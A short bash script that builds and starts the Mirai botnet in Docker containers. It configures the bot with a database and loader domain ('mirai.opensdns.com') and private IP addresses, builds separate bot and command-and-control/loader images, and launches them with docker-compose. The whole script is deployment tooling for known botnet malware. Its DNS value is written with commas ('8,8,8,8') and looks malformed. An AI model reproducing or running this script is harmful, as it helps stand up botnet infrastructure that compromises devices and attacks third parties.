#!/bin/bash

    echo "Building Mirai..."
    echo "<db_domain> = mirai.opensdns.com ..."
    echo "<db_ip> = 192.168.1.70"
    echo "<loader_domain> = mirai.opensdns.com"
    echo "<loader_ip> = 192.168.1.75"
    echo "<dns_domain> = 8,8,8,8"
    docker build -t mirai:bot --build-arg db_domain=mirai.opensdns.com --build-arg db_ip=192.168.1.70 --build-arg loader_domain=mirai.opensdns.com --build-arg loader_ip=192.168.1.75 --build-arg dns_domain=8,8,8,8 ./bot/
    docker build -t mirai:cnc_and_loader ./cnc_and_loader/
    docker-compose up

    echo "Mirai build done"



